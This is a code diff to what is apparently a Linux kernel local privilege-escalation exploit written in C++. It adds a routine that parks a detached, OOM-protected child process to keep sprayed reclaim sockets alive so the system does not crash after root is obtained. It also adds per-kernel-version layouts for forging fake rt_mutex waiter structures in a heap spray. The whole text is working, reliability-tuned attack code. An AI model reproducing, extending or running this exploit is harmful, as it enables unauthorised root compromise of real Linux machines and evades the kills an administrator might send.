@@ -295,6 +295,58 @@ namespace ghostlock::support {
         session::g_exploit_session.heap.prebuilt.destroy();
     }
 
+    void hold_reclaim_sockets_until_exit(void) {
+        /* P0-1 fork-hold. Every reclaim descriptor closes into the same kernel
+     * path: unix_release_sock -> skb_release_data -> put_page on the page the
+     * spray handed us, which was carved out of the kernel image and never had
+     * its refcount raised. The release is what turns a finished run into
+     * "BUG: Bad page state" and, on this kernel (CONFIG_PANIC_ON_OOPS=y), a
+     * reboot right after the root is won.
+     *
+     * fork() gives the child its own references to the whole descriptor table
+     * for free, so parking one child past the parent's exit keeps the socket
+     * alive and suppresses the release without touching the page layout. The
+     * child must NOT set PR_SET_PDEATHSIG: that is exactly what would kill it
+     * with the parent and undo the hold. Costs one sleeping process per run,
+     * which the next reboot clears. */
+        memory::HeapContext &heap = session::g_exploit_session.heap;
+        if (!heap.current.has_reclaim() && !heap.prebuilt.has_reclaim() && !heap.quarantine.has_reclaim()) {
+            return;
+        }
+        static int32_t hold_taken = 0;
+        if (hold_taken) {
+            return;
+        }
+        hold_taken = 1;
+
+        pid_t holder = fork();
+        if (holder < 0) {
+            pr_warning("fork-hold failed errno=%d; the reclaim page may be released at exit\n", errno);
+            return;
+        }
+        if (holder == 0) {
+            /* Own session: a process-group kill aimed at the exploit must not
+         * reach the hold. Then drop stdio so nobody waits on our pipes --
+         * the parent's reader has to see EOF when the parent exits. */
+            (void) setsid();
+            support::UniqueFd devnull(open("/dev/null", O_RDWR | O_CLOEXEC));
+            if (devnull.valid()) {
+                (void) dup2(devnull.get(), STDIN_FILENO);
+                (void) dup2(devnull.get(), STDOUT_FILENO);
+                (void) dup2(devnull.get(), STDERR_FILENO);
+            }
+            support::UniqueFd adj(open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC));
+            if (adj.valid()) {
+                const char value[] = "-1000";
+                (void) write(adj.get(), value, sizeof(value) - 1);
+            }
+            for (;;) {
+                pause();
+            }
+        }
+        pr_info("fork-hold parked pid=%d; reclaim sockets survive this exit\n", holder);
+    }
+
     void cleanup_page_prepare_state(void) {
         memory::close_ctx_memfds(&prepare_ctx);
         memory::close_ctx_memfds(&spray_ctx);
@@ -370,6 +422,7 @@ namespace ghostlock::support {
 
         const profile::kernel_offsets *v = profile_values();
         int32_t compact = session::g_exploit_session.profile.has_compact_waiter();
+        const uint8_t compact_kind = session::g_exploit_session.profile.compact_waiter_kind();
 
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
@@ -397,10 +450,20 @@ namespace ghostlock::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
-                put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
-                put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
+                if (compact_kind == kernel::COMPACT_WAITER_5_10) {
+                    /* 5.10 has no wake_state and no ww_ctx: prio is at 0x40 and
+                     * the structure ends at the deadline. Writing 6.1's layout
+                     * here would put the priority into the wrong half of 0x40
+                     * and spill a ww_ctx word past the end of the structure. */
+                    put32(p, kernel::W0_OFF + 0x40, kernel::FAKE_WAITER_PRIO); /* prio */
+                    put32(p, kernel::W0_OFF + 0x44, 0); /* padding */
+                    put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
+                } else {
+                    put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
+                    put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                    put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
+                    put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
+                }
             } else {
                 /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
                 put64(p, kernel::W0_OFF + 0x00, 1);
